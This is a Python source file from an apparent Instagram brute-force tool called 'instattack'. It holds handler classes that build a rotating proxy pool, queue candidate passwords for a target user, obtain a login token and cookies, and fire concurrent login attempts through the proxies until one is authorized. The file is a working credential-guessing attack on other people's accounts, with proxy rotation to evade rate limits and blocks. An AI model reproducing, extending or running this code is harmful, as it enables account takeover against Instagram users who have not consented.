from __future__ import absolute_import

import asyncio
import aiohttp
import aiojobs

from instattack.lib.utils import (
    percentage, limit_as_completed, cancel_remaining_tasks)

from instattack.app.exceptions import NoPasswordsError
from instattack.app.mixins import LoggerMixin
from instattack.app.proxies.broker import ProxyBroker
from instattack.app.proxies.pool import ProxyPool

from .models import InstagramResults
from .utils import get_token
from .login import attempt


"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""


class Handler(LoggerMixin):

    SCHEDULER_LIMIT = 1000

    def __init__(self, config, user=None, start_event=None, stop_event=None):

        self.config = config
        self.start_event = start_event
        self.stop_event = stop_event
        self.user = user

    async def scheduler(self):
        if not self._scheduler:
            self._scheduler = await aiojobs.create_scheduler(
                limit=self.SCHEDULER_LIMIT,
                exception_handler=None
            )
        return self._scheduler

    async def schedule_task(self, coro):
        scheduler = await self.scheduler()
        await scheduler.spawn(coro)

    async def close_scheduler(self):
        log = self.create_logger('close_scheduler')
        await log.start('Closing Scheduler')
        scheduler = await self.scheduler()
        await scheduler.close()
        await log.complete('Scheduler Closed')


class ProxyHandler(Handler):

    __name__ = "Proxy Handler"

    def __init__(self, config, user=None, start_event=None, stop_event=None, **kwargs):
        """
        [x] TODO:
        ---------
        We need to use the stop event to stop the broker just in case an authenticated
        result is found.

        What would be really cool would be if we could pass in our custom pool
        directly so that the broker popoulated that queue with the proxies.
        """
        super(ProxyHandler, self).__init__(
            config,
            user=user,
            start_event=start_event,
            stop_event=stop_event,
        )

        self.broker = ProxyBroker(config, **kwargs)
        self.pool = ProxyPool(config, self.broker,
            start_event=self.start_event)

    async def stop(self, loop):
        if self.broker._started:
            self.broker.stop(loop)

    async def run(self, loop):
        """
        Retrieves proxies from the queue that is populated from the Broker and
        then puts these proxies in the prioritized heapq pool.

        Prepopulates proxies if the flag is set to put proxies that we previously
        saved into the pool.

        [x] TODO:
        ---------
        We are eventually going to need the relationship between prepopulation
        and collection to be more dynamic and adjust, and collection to trigger
        if we are running low on proxies.
        """
        log = self.create_logger('start', ignore_config=True)
        await log.start(f'Starting {self.__name__}')

        try:
            await log.debug('Prepopulating Proxy Pool...')
            await self.pool.prepopulate(loop)
        except Exception as e:
            raise e

        if self.config['proxies']['collect']:
            # Pool will set start event when it starts collecting proxies.
            await self.pool.collect(loop)
        else:
            if self.start_event.is_set():
                raise RuntimeError('Start Event Already Set')

            self.start_event.set()
            await log.info('Setting Start Event', extra={
                'other': 'Proxy Pool Prepopulated'
            })


class LoginHandler(Handler):

    __name__ = 'Login Handler'

    def __init__(self, config, proxy_handler, **kwargs):
        super(LoginHandler, self).__init__(config, **kwargs)
        self.proxy_handler = proxy_handler

        self._cookies = None
        self._token = None
        self._scheduler = None

        self.passwords = asyncio.Queue()
        self.lock = asyncio.Lock()

        self.save_coros = []
        self.num_completed = 0
        self.num_passwords = 0  # Index for the current password and attempts per password.

    async def attempt_single_login(self, loop, password):
        await self.passwords.put(password)
        self.num_passwords = 1
        results = await self.attempt_login(loop)
        return results

    async def attack(self, loop, limit=None):
        await self.prepopulate(loop, limit=limit)
        results = await self.attempt_login(loop)
        await asyncio.gather(*self.save_coros)
        return results

    async def prepopulate(self, loop, limit=None):
        log = self.create_logger('prepopulate')

        message = f'Generating All Attempts for User {self.user.username}.'
        if limit:
            message = (
                f'Generating {limit} '
                f'Attempts for User {self.user.username}.'
            )
        await log.start(message)

        passwords = await self.user.get_new_attempts(loop, limit=limit)
        if len(passwords) == 0:
            raise NoPasswordsError()

        self.num_passwords = len(passwords)
        for password in passwords:
            await self.passwords.put(password)

        await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")

    @property
    def connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            limit=self.config['connection']['limit'],
            limit_per_host=self.config['connection']['limit_per_host'],
            enable_cleanup_closed=True,
        )

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(
            total=self.config['connection']['timeout']
        )

    @property
    def token(self):
        if not self._token:
            raise RuntimeError('Token Not Found Yet')
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self.connector)
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            await sess.close()

        return self._cookies

    async def proxy_callback(self, proxy):
        await self.proxy_handler.pool.check_and_put(proxy)
        # loop = asyncio.get_event_loop()
        # loop.call_soon(asyncio.create_task(self.proxy_handler.pool.check_and_put(proxy)))
        # await self.schedule_task(proxy.save())

    async def login_task_generator(self, loop, session):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        log = self.create_logger('attempt_login')

        while not self.passwords.empty():
            password = await self.passwords.get()
            if password:
                yield attempt(
                    loop,
                    {
                        'session': session,
                        'user': self.user,
                        'token': self.token,
                        'password': password
                    },
                    pool=self.proxy_handler.pool,
                    batch_size=self.config['attack']['attempts']['batch_size'],
                    proxy_callback=self.proxy_callback,
                )

        await log.debug('Passwords Queue is Empty')

    async def attempt_login(self, loop):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        log = self.create_logger('attempt_login')

        results = InstagramResults(results=[])
        cookies = await self.cookies()

        await self.start_event.wait()

        async with aiohttp.ClientSession(
            connector=self.connector,
            cookies=cookies,
            timeout=self.timeout,
        ) as session:
            gen = self.login_task_generator(loop, session)
            async for (result, num_tries), current_attempts, current_tasks in limit_as_completed(
                gen, self.config['attack']['batch_size'], self.stop_event,
            ):
                # Generator Does Not Yield None on No More Coroutines
                if result.conclusive:
                    self.num_completed += 1
                    results.add(result)

                    pct = percentage(self.num_completed, self.num_passwords)
                    await log.info(f'{pct}', extra={
                        'other': f'Num Attempts: {num_tries}',
                        'password': result.password,
                    })

                    # Add Coroutine to Save/Update Attempt to Coroutine Array
                    self.save_coros.append(self.user.create_or_update_attempt(
                        result.password, success=result.authorized))

                    # TODO: This Causes asyncio.CancelledError
                    # await cancel_remaining_tasks(futures=current_tasks)

                    # Stop Event: Notifies limit_as_completed to stop creating additional tasks
                    # so that we can cancel the leftover ones.
                    if result.authorized:
                        self.stop_event.set()
                        break

        await log.complete('Closing Session')
        await asyncio.sleep(0)

        await self.close_scheduler()
        return results
